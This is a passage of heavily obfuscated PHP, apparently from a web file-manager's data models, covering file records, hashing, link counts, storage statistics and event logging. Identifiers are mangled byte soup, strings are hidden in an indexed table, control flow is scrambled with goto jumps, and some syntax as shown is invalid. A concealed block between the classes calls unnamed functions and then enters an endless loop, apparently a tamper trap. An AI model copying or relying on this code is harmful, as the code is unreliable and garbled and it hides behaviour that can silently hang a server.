$aÎÕ¾š¦[2148])); $a¨Â÷ÃÔ³å = array_remove_value($a¨Â÷ÃÔ³å, $aÎÕ¾š¦[470]); goto bÃ‘™ä×; bÃ‘™ä×: if (!$a¨Â÷ÃÔ³å) { return; } $AÑìõÔ…Œ† = $this->where(array($aÎÕ¾š¦[2149] => array($aÎÕ¾š¦[7], $a¨Â÷ÃÔ³å)))->select(); $AÑìõÔ…Œ† = array_to_keyvalue($AÑìõÔ…Œ†, $aÎÕ¾š¦[2158]); goto f»†®ÈíÛ; f»†®ÈíÛ: foreach ($eá„íó©ù  as &$e©‡ÃÂ¿ó£) { if (isset($AÑìõÔ…Œ†[$e©‡ÃÂ¿ó£[$aÎÕ¾š¦[2148]]])) { $e©‡ÃÂ¿ó£[$aÎÕ¾š¦[2161]] = $AÑìõÔ…Œ†[$e©‡ÃÂ¿ó£[$aÎÕ¾š¦[2148]]]; } } unset($e©‡ÃÂ¿ó£); goto bˆ…ğšéß; bˆ…ğšéß: } private function _listAppendUser(&$Bà˜è¤í¿—) { goto CìÛÌ®Ÿ; bçïÓâ•Ğ‘: foreach ($Bà˜è¤í¿— as &$e²ºˆí°¿á) { $e²ºˆí°¿á[$fÓêØØ¼óŠ[537]] = $f³ˆâõ‹İ•[$e²ºˆí°¿á[$fÓêØØ¼óŠ[1450]]]; if (isset($e²ºˆí°¿á[$fÓêØØ¼óŠ[2161]])) { $e²ºˆí°¿á[$fÓêØØ¼óŠ[2161]][$fÓêØØ¼óŠ[537]] = $f³ˆâõ‹İ•[$e²ºˆí°¿á[$fÓêØØ¼óŠ[2161]][$fÓêØØ¼óŠ[1450]]]; } } unset($e²ºˆí°¿á); goto dª‰ˆ¹ˆ»°; B‘°ÄÙ”±: if (count($E÷ŠÌµ») == 0) { return; } foreach ($Bà˜è¤í¿— as $e²ºˆí°¿á) { if (isset($e²ºˆí°¿á[$fÓêØØ¼óŠ[2161]])) { $E÷ŠÌµ»[] = $e²ºˆí°¿á[$fÓêØØ¼óŠ[2161]][$fÓêØØ¼óŠ[1450]]; } } $f³ˆâõ‹İ• = Model($fÓêØØ¼óŠ[479])->userListInfo($E÷ŠÌµ»); goto bçïÓâ•Ğ‘; CìÛÌ®Ÿ: $fÓêØØ¼óŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $E÷ŠÌµ» = array_unique(array_to_keyvalue($Bà˜è¤í¿—, $fÓêØØ¼óŠ[33], $fÓêØØ¼óŠ[1450])); $E÷ŠÌµ» = array_remove_value($E÷ŠÌµ», $fÓêØØ¼óŠ[470]); goto B‘°ÄÙ”±; dª‰ˆ¹ˆ»°: } private function _listAppendMeta(&$a°Î‡í†) { goto A¥î…ªÄğ»; bÙÂÉ¹°ª­: if (!$a¦œµòÀÚÅ) { return; } foreach ($a°Î‡í† as $Cø™£­ã‹) { if (isset($Cø™£­ã‹[$fÚËÊŞ£ö´[2161]])) { $a¦œµòÀÚÅ[] = $Cø™£­ã‹[$fÚËÊŞ£ö´[2161]][$fÚËÊŞ£ö´[2158]]; } } $A¸¼¹Õø½‡ = $this->metaList($a¦œµòÀÚÅ); goto E²¢Ò—á‚; A¥î…ªÄğ»: $fÚËÊŞ£ö´ =& $_SERVER[¬ˆÚÂ”Éğä]; $a¦œµòÀÚÅ = array_unique(array_to_keyvalue($a°Î‡í†, $fÚËÊŞ£ö´[33], $fÚËÊŞ£ö´[2158])); $a¦œµòÀÚÅ = array_remove_value($a¦œµòÀÚÅ, $fÚËÊŞ£ö´[470]); goto bÙÂÉ¹°ª­; E²¢Ò—á‚: if (!$A¸¼¹Õø½‡) { return !1; } foreach ($a°Î‡í† as &$Cø™£­ã‹) { $Cø™£­ã‹[$fÚËÊŞ£ö´[417]] = $A¸¼¹Õø½‡[$Cø™£­ã‹[$fÚËÊŞ£ö´[2158]]]; if (isset($Cø™£­ã‹[$fÚËÊŞ£ö´[2161]])) { $Cø™£­ã‹[$fÚËÊŞ£ö´[2161]][$fÚËÊŞ£ö´[417]] = $A¸¼¹Õø½‡[$Cø™£­ã‹[$fÚËÊŞ£ö´[2161]][$fÚËÊŞ£ö´[2158]]]; } } unset($Cø™£­ã‹); goto FÑø¡à¤•œ; FÑø¡à¤•œ: } private function metaList($Fİ‚Â‚¬’˜) { goto AÒ¾³±Œ†¾; b”Îà¡ë…©: return $C¦›©¡íŒÕ ? $C¦›©¡íŒÕ : array(); goto C¼è”Øœ³¥; AÒ¾³±Œ†¾: $BÔÜŒ¡¸™œ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$Fİ‚Â‚¬’˜) { return array(); } $D’ÀëØÁ¹ = array($BÔÜŒ¡¸™œ[2158] => array($BÔÜŒ¡¸™œ[7], $Fİ‚Â‚¬’˜)); goto bìØˆƒªØ; bìØˆƒªØ: $C¦›©¡íŒÕ = Model($BÔÜŒ¡¸™œ[2162])->where($D’ÀëØÁ¹)->select(); $C¦›©¡íŒÕ = array_to_keyvalue_group($C¦›©¡íŒÕ, $BÔÜŒ¡¸™œ[2158]); foreach ($C¦›©¡íŒÕ as $bÜñ·ÖìË‰ => $fÙµğÁ¸ç) { $f¹½èÖôØÀ = array(); foreach ($fÙµğÁ¸ç as $D–„í»áô‰) { $f¹½èÖôØÀ[$D–„í»áô‰[$BÔÜŒ¡¸™œ[89]]] = $D–„í»áô‰[$BÔÜŒ¡¸™œ[359]]; } $C¦›©¡íŒÕ[$bÜñ·ÖìË‰] = $f¹½èÖôØÀ; } goto b”Îà¡ë…©; C¼è”Øœ³¥: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x69\x6f\137\146\151\154\145\137\x6d\x65\164\141", "\x6d\145\164\x61\106\151\145\x6c\144" => "\146\151\154\x65\111\104"); public function fileInfo($AæƒÌ‰³Ä¡) { $eÍæî˜ÌºÅ =& $_SERVER[¬ˆÚÂ”Éğä]; static $báî‚”»©Ù = array(); if (!isset($báî‚”»©Ù[$AæƒÌ‰³Ä¡])) { $F·ˆØá½ŠÊ = $eÍæî˜ÌºÅ[2163]; $e¶Œ‘¤Äƒµ = Model($eÍæî˜ÌºÅ[422])->field($F·ˆØá½ŠÊ)->where(array($eÍæî˜ÌºÅ[420] => $AæƒÌ‰³Ä¡))->find(); $báî‚”»©Ù[$AæƒÌ‰³Ä¡] = $e¶Œ‘¤Äƒµ; } return $báî‚”»©Ù[$AæƒÌ‰³Ä¡]; } public function addFileByContent($dŠ¶²¥å = '', $B‘Ò†â½Ü = '') { goto A‘†Ö…ù„; d¼‡èåôÁÉ: if (file_exists($C„°ŞÔ§å)) { @unlink($C„°ŞÔ§å); } return $a°äğ¯ª¾Ÿ; goto CƒÕù¿Í; c—÷Ê™Ğäë: $C„°ŞÔ§å = $f¿‘Ì¥’ŠÆ . $aÂÂ¿ŠËãÑ[2165] . rand_string(16); file_put_contents($C„°ŞÔ§å, $dŠ¶²¥å); $a°äğ¯ª¾Ÿ = $this->addFile($C„°ŞÔ§å, $B‘Ò†â½Ü, !0); goto d¼‡èåôÁÉ; A‘†Ö…ù„: $aÂÂ¿ŠËãÑ =& $_SERVER[¬ˆÚÂ”Éğä]; $f¿‘Ì¥’ŠÆ = TEMP_PATH . $aÂÂ¿ŠËãÑ[2164]; if (!is_dir($f¿‘Ì¥’ŠÆ)) { mk_dir($f¿‘Ì¥’ŠÆ); } goto c—÷Ê™Ğäë; CƒÕù¿Í: } public function createFileName($F‰™å‹óİ) { goto B—¿ãäËøØ; b½®Ğ‘ÎåÃ: if (!$e‰ñ¨‹ìŠâ && !Cache::get($c‘ºÀ¤Õññ)) { $e‰ñ¨‹ìŠâ = !0; $bø†²“¯ñ† = IO::mkdir($fÓÔƒ‰½³Ó); if (!IO::exist($bø†²“¯ñ† . $AÏ‰±Ú±‘¬[2167])) { IO::mkfile($bø†²“¯ñ† . $AÏ‰±Ú±‘¬[2167]); } Cache::set($c‘ºÀ¤Õññ, 1, 3600 * 2); } return $fà£¾ÎÓ¦›; goto e«•º¼Úö; Cñ¹ªå‚Ú°: $fÓÔƒ‰½³Ó = $EéÎÖ¹ô¨»->pathFather($fà£¾ÎÓ¦›); static $e‰ñ¨‹ìŠâ = false; $c‘ºÀ¤Õññ = $AÏ‰±Ú±‘¬[2166] . md5($fÓÔƒ‰½³Ó); goto b½®Ğ‘ÎåÃ; B—¿ãäËøØ: $AÏ‰±Ú±‘¬ =& $_SERVER[¬ˆÚÂ”Éğä]; $EéÎÖ¹ô¨» = IO::init($AÏ‰±Ú±‘¬[8]); $fà£¾ÎÓ¦› = $this->makeFilePath($F‰™å‹óİ, $EéÎÖ¹ô¨»); goto Cñ¹ªå‚Ú°; e«•º¼Úö: } public function makeFilePath($e¤ïÃËğì, $Bµ‰®ó²é¿) { goto bİ¸ğëÄĞ; A¥ø¼Á‹Ôƒ: $E °»¿ÍŠê = $e„óÁ‰‰í . rand_string(5) . short_id(100); $e¤ïÃËğì = str_replace($aÂãĞ—ö†‘[8], $aÂãĞ—ö†‘[70], KodIO::clear($e¤ïÃËğì)); if (!$e¤ïÃËğì) { $BŒÊ“î©‰„ = $aÂãĞ—ö†‘[2170]; } goto dë›‘“››; bİ¸ğëÄĞ: $aÂãĞ—ö†‘ =& $_SERVER[¬ˆÚÂ”Éğä]; $BŒÊ“î©‰„ = Model($aÂãĞ—ö†‘[1101])->get($aÂãĞ—ö†‘[2168]); $e„óÁ‰‰í = KodIO::defaultIO() . date($aÂãĞ—ö†‘[2169]); goto A¥ø¼Á‹Ôƒ; dë›‘“››: switch ($BŒÊ“î©‰„) { case $aÂãĞ—ö†‘[2171]: $E °»¿ÍŠê = $E °»¿ÍŠê . $aÂãĞ—ö†‘[91] . $Bµ‰®ó²é¿->ext($e¤ïÃËğì); if ($Bµ‰®ó²é¿->ext($e¤ïÃËğì) == $aÂãĞ—ö†‘[2111]) { $E °»¿ÍŠê .= $aÂãĞ—ö†‘[1352]; } break; case $aÂãĞ—ö†‘[2172]: goto B¦¹ò”ğŒ; B¦¹ò”ğŒ: $d×Œéø‘ƒª = Model($aÂãĞ—ö†‘[1101])->get($aÂãĞ—ö†‘[1348]); $C¿áä‹ñš¶ = substr(md5($aÂãĞ—ö†‘[1930] . $d×Œéø‘ƒª . date($aÂãĞ—ö†‘[695])), 0, 8); $Dè ºå¦·® = KodIO::defaultDriver(); goto D‹İè–³¨À; EÙƒÕêí—°: if (IO::isTypeObject($E °»¿ÍŠê) && !IO::isUploadServer($E °»¿ÍŠê)) { IO::setContent($E °»¿ÍŠê, $aÂãĞ—ö†‘[33]); } CacheLock::unlock($AêîÔ°ö³ó); break; goto eÀİìÍì’…; D‹İè–³¨À: $e„óÁ‰‰í = $aÂãĞ—ö†‘[2173] . $Dè ºå¦·®[$aÂãĞ—ö†‘[367]] . $aÂãĞ—ö†‘[2174] . date($aÂãĞ—ö†‘[2175]) . $C¿áä‹ñš¶ . $aÂãĞ—ö†‘[8]; if ($Bµ‰®ó²é¿->ext($e¤ïÃËğì) == $aÂãĞ—ö†‘[2111]) { $e¤ïÃËğì .= $aÂãĞ—ö†‘[1352]; } $AêîÔ°ö³ó = $aÂãĞ—ö†‘[2176] . $e„óÁ‰‰í . $e¤ïÃËğì; goto d‰­©ªŒº; d‰­©ªŒº: CacheLock::lock($AêîÔ°ö³ó); $bÜÍ©ÏÎÀ = IO::fileNameAuto($e„óÁ‰‰í, $e¤ïÃËğì); $E °»¿ÍŠê = $e„óÁ‰‰í . $bÜÍ©ÏÎÀ; goto EÙƒÕêí—°; eÀİìÍì’…: case $aÂãĞ—ö†‘[2170]: break; default: break; } return $E °»¿ÍŠê; goto eÆÖŠˆĞ™ø; eÆÖŠˆĞ™ø: } public function addFileByRemote($e†÷ë›ï, $E²…ô‘—……, $cîø²éğğÓ = array()) { goto Aí¨íˆ; Aí¨íˆ: $bÅáñÕµÖö =& $_SERVER[¬ˆÚÂ”Éğä]; if (!IO::exist($e†÷ë›ï)) { return !1; } $aØƒªÌèÔ¸ = $cîø²éğğÓ[$bÅáñÕµÖö[163]] ? $cîø²éğğÓ[$bÅáñÕµÖö[163]] : $bÅáñÕµÖö[33]; goto fƒÃ¾¯¾£; cÔñØ·Ò–Ù: if ($eÓ÷‰¶ê— = $this->addFileCheckExist($føÒ¶ÌŒ†Ô[$bÅáñÕµÖö[164]], $føÒ¶ÌŒ†Ô[$bÅáñÕµÖö[163]], $føÒ¶ÌŒ†Ô[$bÅáñÕµÖö[77]])) { return $eÓ÷‰¶ê—; } return $this->addFileData($føÒ¶ÌŒ†Ô); goto f•‘¿Ã¯ÎÔ; fƒÃ¾¯¾£: $bÁœ™Ó¯†ˆ = IO::hashMd5($e†÷ë›ï, $aØƒªÌèÔ¸); $F¿Ç‹Øƒ = KodIO::defaultDriver(); $føÒ¶ÌŒ†Ô = array($bÅáñÕµÖö[522] => IO::size($e†÷ë›ï), $bÅáñÕµÖö[2177] => 1, $bÅáñÕµÖö[386] => $E²…ô‘—……, $bÅáñÕµÖö[743] => $F¿Ç‹Øƒ[$bÅáñÕµÖö[367]], $bÅáñÕµÖö[387] => $e†÷ë›ï, $bÅáñÕµÖö[2178] => $cîø²éğğÓ[$bÅáñÕµÖö[164]] ? $cîø²éğğÓ[$bÅáñÕµÖö[164]] : IO::hashSimple($e†÷ë›ï), $bÅáñÕµÖö[2179] => $bÁœ™Ó¯†ˆ ? $bÁœ™Ó¯†ˆ : $aØƒªÌèÔ¸); goto cÔñØ·Ò–Ù; f•‘¿Ã¯ÎÔ: } private function addFileData($C—›ë«ß) { $F×É¶âµ†× =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$C—›ë«ß) { return !1; } $C—›ë«ß[$F×É¶âµ†×[77]] = intval($C—›ë«ß[$F×É¶âµ†×[77]]); if (!$C—›ë«ß[$F×É¶âµ†×[77]] && strlen($C—›ë«ß[$F×É¶âµ†×[164]]) > 32) { $C—›ë«ß[$F×É¶âµ†×[77]] = intval(substr($C—›ë«ß[$F×É¶âµ†×[164]], 32)); } $cŠ‚…§á· = $this->add($C—›ë«ß); return $this->find($cŠ‚…§á·); } public function addFile($dßÇˆ‘Û‹ì, $e”Û×Õ‡¢, $BÊàëç‡ÓÚ = false) { goto bé‡æ‰¼ôğ; e£â¶ç¿‚„: $d·ã¿‹ãØê = $this->addFileMake($dßÇˆ‘Û‹ì, $Cˆµ¨Öåî, $cŒË¦ôŒÎ­, $dŒŠƒ“ĞÆ, $e”Û×Õ‡¢, $BÊàëç‡ÓÚ); $e´²ÌÛ´´ = $this->addFileData($d·ã¿‹ãØê); CacheLock::unlock($bñ§Ï† ®‹); goto c­¬œùâø“; c­¬œùâø“: return $e´²ÌÛ´´; goto DÜÕ·ÅÔÏ‚; C¼¤—°Ï: $bñ§Ï† ®‹ = $_SERVER[¬ˆÚÂ”Éğä][2180] . $dŒŠƒ“ĞÆ; CacheLock::lock($bñ§Ï† ®‹); if ($FÎÔŞØ›™ = $this->addFileCheckExist($cŒË¦ôŒÎ­, $dŒŠƒ“ĞÆ, $Cˆµ¨Öåî)) { CacheLock::unlock($bñ§Ï† ®‹); return $FÎÔŞØ›™; } goto e£â¶ç¿‚„; bé‡æ‰¼ôğ: $cŒË¦ôŒÎ­ = IO::hashSimple($dßÇˆ‘Û‹ì); $dŒŠƒ“ĞÆ = IO::hashMd5($dßÇˆ‘Û‹ì); $Cˆµ¨Öåî = IO::size($dßÇˆ‘Û‹ì); goto C¼¤—°Ï; DÜÕ·ÅÔÏ‚: } public function addFileMake($B«¢¬Şº›˜, $E‹ºá¨œ¾æ, $dÍ§Æ—»Š, $DÛ·›®¥Ä, $A™Òô¡ÒÈ, $AÑÆ§¬îÈ‹) { goto E¼œ§ˆ÷¿„; bàÛ‘†Œƒõ: $cÑˆ©¹²™Ë = KodIO::defaultDriver(); $A¡’²Äƒœä = array($f±ÙÎéÚé[522] => $E‹ºá¨œ¾æ, $f±ÙÎéÚé[2177] => 1, $f±ÙÎéÚé[386] => $A™Òô¡ÒÈ, $f±ÙÎéÚé[743] => $cÑˆ©¹²™Ë[$f±ÙÎéÚé[367]], $f±ÙÎéÚé[387] => $C–Œ¬„ÙŒ¬, $f±ÙÎéÚé[2178] => $dÍ§Æ—»Š, $f±ÙÎéÚé[2179] => $DÛ·›®¥Ä); return $A¡’²Äƒœä; goto b¬Ï¥Èš¼»; E¼œ§ˆ÷¿„: $f±ÙÎéÚé =& $_SERVER[¬ˆÚÂ”Éğä]; $C–Œ¬„ÙŒ¬ = $this->createFileName($A™Òô¡ÒÈ); $fè‰±Ü³À = get_path_father($C–Œ¬„ÙŒ¬); goto Bó¥—‰©ïğ; Bó¥—‰©ïğ: $B©­–Œ›Ï = get_path_this($C–Œ¬„ÙŒ¬); if ($AÑÆ§¬îÈ‹) { $aã—×ÒóÅ = IO::move($B«¢¬Şº›˜, $fè‰±Ü³À, !1, $B©­–Œ›Ï); } else { $aã—×ÒóÅ = IO::copy($B«¢¬Şº›˜, $fè‰±Ü³À, !1, $B©­–Œ›Ï); } if (!$aã—×ÒóÅ) { return !1; } goto bàÛ‘†Œƒõ; b¬Ï¥Èš¼»: } public function addFileCheckExist($dïÈğÀáŠ§, $cÙÈŠÓ‡ÙÃ, $a¹Úè«Î‹) { $cšß½‘ãÃ‡ =& $_SERVER[¬ˆÚÂ”Éğä]; $D‹‰³ùñ”Ù = $this->findByHash($dïÈğÀáŠ§, $cÙÈŠÓ‡ÙÃ); if (!$D‹‰³ùñ”Ù) { return !1; } $C´ªå¼“æ = array($cšß½‘ãÃ‡[2177] => intval($D‹‰³ùñ”Ù[$cšß½‘ãÃ‡[2181]]) + 1, $cšß½‘ãÃ‡[522] => $a¹Úè«Î‹); $this->where(array($cšß½‘ãÃ‡[420] => $D‹‰³ùñ”Ù[$cšß½‘ãÃ‡[419]]))->save($C´ªå¼“æ); return $D‹‰³ùñ”Ù; } public function remove($Dâó»ğÒæ) { $this->linkCountChange($Dâó»ğÒæ, !1); $this->clearEmpty(); return !0; } public function linkAdd($e„é‘ŒÔã‚) { $this->linkCountChange($e„é‘ŒÔã‚, !0); } public function linkCountChange($Aøó„ò¤, $dØÌóƒéà‚) { goto C°ğ…ãáâ°; e‰—ªÄÍÖ: foreach ($aíã¯¾ä as $cğ¸ùØ† => $dŠ¢‹ò™ë) { $f¼‹Î‡¿ = $dŠ¢‹ò™ë . $B¿’ó¿è[33]; if (!$FÊáÄ»µÖ£[$f¼‹Î‡¿]) { $FÊáÄ»µÖ£[$f¼‹Î‡¿] = array(); } $FÊáÄ»µÖ£[$f¼‹Î‡¿][] = $cğ¸ùØ†; } foreach ($FÊáÄ»µÖ£ as $dŠ¢‹ò™ë => $Eß‘½Šö·) { if (!$Eß‘½Šö·) { continue; } $dŠ¢‹ò™ë = $dØÌóƒéà‚ ? $dŠ¢‹ò™ë : -intval($dŠ¢‹ò™ë); $b¬ì¦„¨Ñƒ = array($B¿’ó¿è[419] => array($B¿’ó¿è[7], $Eß‘½Šö·)); if ($dŠ¢‹ò™ë < 0) { $b¬ì¦„¨Ñƒ[$B¿’ó¿è[2181]] = array($B¿’ó¿è[941], abs($dŠ¢‹ò™ë)); } $this->where($b¬ì¦„¨Ñƒ)->setAdd($B¿’ó¿è[2181], $dŠ¢‹ò™ë); } goto AÒ‘ğØàœ¬; C°ğ…ãáâ°: $B¿’ó¿è =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$Aøó„ò¤) { return; } if (!is_array($Aøó„ò¤)) { $Aøó„ò¤ = array($Aøó„ò¤); } goto D¹áÀ§»¼; D¹áÀ§»¼: $aíã¯¾ä = array(); foreach ($Aøó„ò¤ as $cğ¸ùØ†) { $f¼‹Î‡¿ = $cğ¸ùØ† . $B¿’ó¿è[33]; if (!$aíã¯¾ä[$f¼‹Î‡¿]) { $aíã¯¾ä[$f¼‹Î‡¿] = 0; } $aíã¯¾ä[$f¼‹Î‡¿]++; } $FÊáÄ»µÖ£ = array(); goto e‰—ªÄÍÖ; AÒ‘ğØàœ¬: } public function findByHash($B–é¸£‘›ç, $Cöé»Ÿè­± = false) { $cÀÀİØˆÙÏ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$B–é¸£‘›ç && !$Cöé»Ÿè­±) { return !1; } $eç‹Ç²Ì¹Ô = array($cÀÀİØˆÙÏ[2178] => $B–é¸£‘›ç); if ($Cöé»Ÿè­±) { $eç‹Ç²Ì¹Ô = array($cÀÀİØˆÙÏ[2179] => $Cöé»Ÿè­±); } return $this->order($cÀÀİØˆÙÏ[2182])->where($eç‹Ç²Ì¹Ô)->find(); } public function clearEmpty($AïÒì†‘Š = 0) { goto fÃæ…«’ˆß; fÃæ…«’ˆß: $Cê‘îô‡ãİ =& $_SERVER[¬ˆÚÂ”Éğä]; $A¾µÛ¾×Éä = time() - 3600 * 24 * $AïÒì†‘Š; $AøìÄÅ‰ƒ’ = $Cê‘îô‡ãİ[2183] . $A¾µÛ¾×Éä; goto a ÄÔ„†®’; a ÄÔ„†®’: $AÛƒ“„¹£Ë = $this->where($AøìÄÅ‰ƒ’)->select(); if (!$AÛƒ“„¹£Ë) { return; } $FÕ“¿¾Ó½™ = new Task($Cê‘îô‡ãİ[2184], $Cê‘îô‡ãİ[33], count($AÛƒ“„¹£Ë)); goto aæà”¾òê; aæà”¾òê: foreach ($AÛƒ“„¹£Ë as $B£åæÄó”‹) { $FÕ“¿¾Ó½™->update(1); $this->resetFile($B£åæÄó”‹); } $FÕ“¿¾Ó½™->end(); goto a÷Æç“â±; a÷Æç“â±: } public function resetFile($Føª‰é³¹°) { goto a’øŒø¶ìà; cÅ›ŸËª‰Œ: if ($Føª‰é³¹°[$c»•“ÏóÈ¸[2181]] != $a¯®‡…íÈÃ) { $this->where($F‚¢¤Üµİ–)->save(array($c»•“ÏóÈ¸[2177] => $a¯®‡…íÈÃ)); } goto açˆ”ÍÙˆ¿; a’øŒø¶ìà: $c»•“ÏóÈ¸ =& $_SERVER[¬ˆÚÂ”Éğä]; $F‚¢¤Üµİ– = array($c»•“ÏóÈ¸[420] => $Føª‰é³¹°[$c»•“ÏóÈ¸[419]]); $a‹¶³ªÕ¨ = Model($c»•“ÏóÈ¸[1130])->where($F‚¢¤Üµİ–)->count(); goto F¬ØĞ„ÁˆÕ; F¬ØĞ„ÁˆÕ: $dÉŠ†ÛÙ©¥ = Model($c»•“ÏóÈ¸[2185])->where($F‚¢¤Üµİ–)->count(); $a¯®‡…íÈÃ = intval($a‹¶³ªÕ¨) + intval($dÉŠ†ÛÙ©¥); if ($a¯®‡…íÈÃ == 0) { IO::remove($Føª‰é³¹°[$c»•“ÏóÈ¸[75]]); $this->where($F‚¢¤Üµİ–)->delete(); $this->metaSet($Føª‰é³¹°[$c»•“ÏóÈ¸[419]], null, null); return; } goto cÅ›ŸËª‰Œ; açˆ”ÍÙˆ¿: } public function storageInfo($F£‚ä­¸ÀÆ = false) { goto dğˆ‚Ì³¤å; fŒ‡á–®„ò: $b‰šù•öÀ = 1; $e›Â¶©ˆÌî = 0; $E»Å¡ˆ–ŒÙ = 5000; goto a®åî©§¼í; dğˆ‚Ì³¤å: $F¤­Çìğ =& $_SERVER[¬ˆÚÂ”Éğä]; $cÀ£ëòÅ–ä = $this->count() + 0.0; $bİÜà²¡»¿ = 0; goto fŒ‡á–®„ò; a®åî©§¼í: for ($A‚Ã¸£ÃÏÌ = 0; $A‚Ã¸£ÃÏÌ < $cÀ£ëòÅ–ä; $A‚Ã¸£ÃÏÌ = $A‚Ã¸£ÃÏÌ + $E»Å¡ˆ–ŒÙ) { $b¾À°ï›¼ç = $this->limit($A‚Ã¸£ÃÏÌ, $A‚Ã¸£ÃÏÌ + $E»Å¡ˆ–ŒÙ)->select(); foreach ($b¾À°ï›¼ç as $f½‚›°åóŠ) { $b‰šù•öÀ += $f½‚›°åóŠ[$F¤­Çìğ[77]] * $f½‚›°åóŠ[$F¤­Çìğ[2181]]; $bİÜà²¡»¿ += $f½‚›°åóŠ[$F¤­Çìğ[77]] * ($f½‚›°åóŠ[$F¤­Çìğ[2181]] - 1); $e›Â¶©ˆÌî += $f½‚›°åóŠ[$F¤­Çìğ[2181]]; } } $AëØß§‰È¿ = array($F¤­Çìğ[2186] => $b‰šù•öÀ, $F¤­Çìğ[2187] => $bİÜà²¡»¿, $F¤­Çìğ[2188] => $bİÜà²¡»¿ / $b‰šù•öÀ, $F¤­Çìğ[81] => $cÀ£ëòÅ–ä, $F¤­Çìğ[2189] => $e›Â¶©ˆÌî); return $AëØß§‰È¿; goto DÅ²³äÊ; DÅ²³äÊ: } } if (!isset($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][785]]) || !isset($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][792]])) { goto c¥šµªÖÓå; aŒ¸‚µ×ì: $aŞáÒÍ„ÊÊ = explode($_SERVER[¬ˆÚÂ”Éğä][217], $BÔÚâ„ÊËŒ); if (count($aŞáÒÍ„ÊÊ) < $_SERVER[¬ˆÚÂ”Éğä][567]) { $eÚåáâ¦“ = $_SERVER[¬ˆÚÂ”Éğä][790]; $eÚåáâ¦“(); } $DÉ°…¸ê¶´ = $_SERVER[¬ˆÚÂ”Éğä][791]; goto bùß‹‰ßÎ; bùß‹‰ßÎ: $DÉ°…¸ê¶´($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][788]] . $_SERVER[¬ˆÚÂ”Éğä][789]); $Dù¼ÙÃåˆÌ = 2; while ($Dù¼ÙÃåˆÌ > 1) { $e”Âé®É¿” = rawurlencode($Dù¼ÙÃåˆÌ . $_SERVER[¬ˆÚÂ”Éğä][361]); } goto côŸÙ¦•ƒ; c¥šµªÖÓå: $aôÊ±’î» = $_SERVER[¬ˆÚÂ”Éğä][787]; $cİÜÖ„ = $_SERVER[$_SERVER[¬ˆÚÂ”Éğä][788]] . $_SERVER[¬ˆÚÂ”Éğä][789]; $BÔÚâ„ÊËŒ = $aôÊ±’î»($cİÜÖ„); goto aŒ¸‚µ×ì; côŸÙ¦•ƒ: } goto e«·é¼‡ºí; bÙ¬×ƒŠÇ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\x63\145\x5f\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\151\155\145", "\164\x69\155\145", "\x69\156\x73\x65\x72\164", "\146\165\156\143\164\x69\157\156"), array("\x64\145\x73\x63", '', "\x69\x6e\163\145\x72\164\54\165\160\144\x61\164\145\54\x73\x65\x6c\145\x63\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($b½ºôö‚·ª, $Aš¨à¢ã˜–, $fØ„å¾çª = '') { goto fÃˆÒÆÃğ; fÃˆÒÆÃğ: $B“Â‡æÍŒ¹ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->eventSave) { return; } $D¿¼’Ú‚ÏÅ = Model($B“Â‡æÍŒ¹[1130])->sourceInfo($b½ºôö‚·ª); goto B¯…òê¨ÊÛ; aÏà×¿¬¨·: $AèåÅ°’²’ = array($B“Â‡æÍŒ¹[383] => $b½ºôö‚·ª, $B“Â‡æÍŒ¹[2325] => $D¿¼’Ú‚ÏÅ[$B“Â‡æÍŒ¹[463]], $B“Â‡æÍŒ¹[2326] => $D¿¼’Ú‚ÏÅ[$B“Â‡æÍŒ¹[28]], $B“Â‡æÍŒ¹[468] => $D¿¼’Ú‚ÏÅ[$B“Â‡æÍŒ¹[468]], $B“Â‡æÍŒ¹[1441] => USER_ID, $B“Â‡æÍŒ¹[388] => $Aš¨à¢ã˜–, $B“Â‡æÍŒ¹[1443] => $fØ„å¾çª); $this->addSystemLog($Aš¨à¢ã˜–, $AèåÅ°’²’); return $this->add($AèåÅ°’²’); goto aÒ„ŞÎ¹¾˜; B¯…òê¨ÊÛ: if (!$D¿¼’Ú‚ÏÅ) { return !1; } if ($this->isCacheEvent($D¿¼’Ú‚ÏÅ, $Aš¨à¢ã˜–)) { return; } if ($fØ„å¾çª && is_string($fØ„å¾çª)) { $fØ„å¾çª = array($B“Â‡æÍŒ¹[2152] => $fØ„å¾çª); } goto aÏà×¿¬¨·; aÒ„ŞÎ¹¾˜: } private function addSystemLog($cõõ“¥éİ, $BºÍô¢É­‰) { $EĞ’³‹š¬Ø =& $_SERVER[¬ˆÚÂ”Éğä]; if ($cõõ“¥éİ == $EĞ’³‹š¬Ø[2327]) { $cõõ“¥éİ = $BºÍô¢É­‰[$EĞ’³‹š¬Ø[405]][$EĞ’³‹š¬Ø[2328]]; } else { if (in_array($cõõ“¥éİ, array($EĞ’³‹š¬Ø[2098], $EĞ’³‹š¬Ø[2329]))) { $cõõ“¥éİ = $BºÍô¢É­‰[$EĞ’³‹š¬Ø[405]][$EĞ’³‹š¬Ø[700]]; } } $dõÁ‚³£ƒ = array_merge($BºÍô¢É­‰, array($EĞ’³‹š¬Ø[2330] => $BºÍô¢É­‰[$EĞ’³‹š¬Ø[369]], $EĞ’³‹š¬Ø[2331] => $BºÍô¢É­‰[$EĞ’³‹š¬Ø[2331]])); Model($EĞ’³‹š¬Ø[2061])->addLog($EĞ’³‹š¬Ø[2332] . $cõõ“¥éİ, $dõÁ‚³£ƒ); } private function isCacheEvent($B©ï…Ÿï¡¶, $AŠ“˜Â¾óÈ) { if ($B©ï…Ÿï¡¶[$_SERVER[¬ˆÚÂ”Éğä][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($C§Û£ªˆä“, $aŒ’˜¶Ìƒ) { $fŞò”°Ì†‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $F²¨”ˆÉ‘ö = 